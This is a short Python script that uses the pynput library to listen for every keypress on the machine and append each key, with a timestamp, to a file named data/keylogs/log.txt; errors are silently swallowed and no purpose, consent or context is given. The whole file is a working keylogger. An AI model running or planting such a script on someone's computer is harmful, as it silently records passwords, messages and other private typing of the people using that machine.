from pynput import keyboard
import time
import os

log_file = "data/keylogs/log.txt"
os.makedirs(os.path.dirname(log_file), exist_ok=True)

def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(f"{key.char if hasattr(key, 'char') else str(key)} {time.time()}\n")

def on_press(key):
    try:
        write_to_file(key)
    except:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
